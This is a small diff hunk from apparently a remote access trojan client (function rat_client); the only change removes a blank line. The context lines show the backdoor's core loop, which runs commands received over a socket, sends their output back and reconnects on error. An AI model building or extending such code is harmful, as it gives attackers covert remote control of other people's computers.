@@ -237,7 +237,6 @@ def rat_client():
 			else:
 				output = execute_commands(command)
 				s.send(str.encode(output))
-				
 	except socket.error as e:
 		print(f"Socket error: {e}. Reconnecting...")
 		s.close()
